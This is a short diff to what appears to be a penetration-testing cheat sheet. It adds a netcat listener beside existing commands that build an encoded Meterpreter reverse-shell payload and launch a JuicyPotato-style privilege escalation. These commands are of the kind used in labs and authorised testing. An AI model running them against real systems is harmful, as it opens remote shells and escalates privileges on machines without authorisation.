@@ -327,6 +327,8 @@ FOR /F %%i IN (CLSID.list) DO (
   
 ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe```
 
+```nc -lvnp 4443```
+
 ```PS C:\users\public> .\jp.exe -t * -p .\m.exe -l 4444 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"```
 
 ##### Search for contents and files:
